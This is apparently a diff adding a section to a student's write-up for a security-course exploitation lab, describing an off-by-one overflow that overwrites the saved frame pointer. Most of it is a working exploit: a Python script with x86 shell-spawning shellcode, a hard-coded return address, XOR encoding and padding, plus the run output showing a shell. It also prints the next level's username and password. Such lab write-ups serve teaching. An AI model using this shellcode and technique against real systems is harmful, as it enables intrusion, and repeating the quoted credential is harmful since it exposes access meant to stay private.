@@ -149,3 +149,77 @@ b = binascii.unhexlify(payload)
 with open('/dev/fd/1','wb') as f:
     f.write(b)
 ```
+
+## 3
+
+The question is off-by-one overflow problem. After reading aslr.pdf figure 30, I know that I should set %ebp to &buf[0] (0xbffffa40), and put the new return address in &buf[1], and put the payload. So I should overflow an "40" to %ebp. Now I'll do it.
+
+However, after implementing the solution above, ./debug-exploit works but ./exploit doesn't. That's because overflowed "0x40" xor "1<<5" yields "`", which is beaking the shell (in the buggy exploit script). So I shift everything 4 bytes right. Now %ebp is set to &buf[1] and new return address is set to &buf[2] and overflowed byte is "44". Now everything is OK.
+
+```
+pwnable:~$ ./exploit
+#Eg#EgL���j1X̀�É�jFX̀1�Ph//shh/binT[PS��1Ұ
+
+D���9���'�������]���'��� ���4���
+/home/brown $ cat README
+Remember, all I'm offering is the truth. Nothing more.
+
+Next username: jz
+Next password: cqkeuevfIO
+```
+
+My `./arg` is still attached below. Note that my `./egg` is empty.
+
+```
+#!/usr/bin/python3
+
+def fuck8(txt):
+    assert(len(txt) == 8)
+    return txt[6:8] + txt[4:6] + txt[2:4] + txt[0:2]
+
+def revert(txt):
+    assert(len(txt) % 8 == 0)
+    res = ""
+    for i in range(int(len(txt) / 8)):
+        res += fuck8(txt[i*8:(i+1)*8])
+    return res
+
+## The FUCKING silly script booms the shell because overflow="40"="`".
+## cs161-atw
+#raddr = "bffffa48"
+##shellcode = "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
+#shellcode = "6a3158cd8089c389c16a4658cd8031c050682f2f7368682f62696e545b505389e131d2b00bcd800a"
+#
+#overflow = "40" 
+#buf0 = "01234567"
+#
+#length_to_fill = 64 - 8 - int(len(shellcode)/2)
+#fill = "01" * length_to_fill
+#
+#payload = buf0 + revert(raddr) + (shellcode) + fill + overflow
+
+## cs161-atw
+raddr = "bffffa4c"
+#shellcode = "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
+shellcode = "6a3158cd8089c389c16a4658cd8031c050682f2f7368682f62696e545b505389e131d2b00bcd800a"
+
+overflow = "44"
+buf0 = "01234567"
+
+length_to_fill = 64 - 8 - 4 - int(len(shellcode)/2)
+fill = "01" * length_to_fill
+
+payload = buf0 + buf0 + revert(raddr) + (shellcode) + fill + overflow
+
+
+import binascii
+
+b = binascii.unhexlify(payload)
+b = bytes([byte^(1<<5) for byte in b])
+with open('/dev/fd/1','wb') as f:
+    f.write(b)
+
+```
+
+
+
